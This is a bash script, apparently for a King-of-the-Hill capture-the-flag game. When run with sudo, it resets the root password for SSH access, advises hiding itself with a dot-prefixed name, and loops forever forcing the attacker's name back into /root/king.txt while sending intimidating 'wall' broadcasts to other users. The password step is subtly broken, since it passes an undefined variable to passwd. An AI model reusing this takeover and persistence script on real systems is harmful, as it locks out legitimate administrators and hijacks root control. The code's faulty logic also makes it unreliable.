# A script to get some shit done
# Authors : Cipher 

# Usage : 
#        chmod +x <filename>
#        sudo bash <filename>

#tip: use a dot before your file name to just hide your file and store the file in the root folder
#after the scipt changes the password, you can directly ssh into the box as root

NAME=Cipher007  #change this
PASS=notcrackable!   #change this


echo "[*]Changing password of root"
echo $PASS | passwd $NEW      #changes the root password
echo "[+] Passowrd changed! LMAO"

count=1

while [ 1 ]; do
	LOG=$(cat /root/king.txt)
	if [[ $LOG != $NAME ]]; then
		echo "[*] modification observed."
		echo $NAME > /root/king.txt #puts your username back into the file
		echo "[+] got shit fixed! nothing to worry about!"
		let 'count+=1'
	fi

	if [ $count -eq 4 ]; then
		wall -n "What is going on? Stay outta here or face the consequences!"     #asking him to stay out! not politely though!
		echo "[*] $count changes made in king.txt! Find this dude immediately!"
		let 'count+=1'
	fi

done

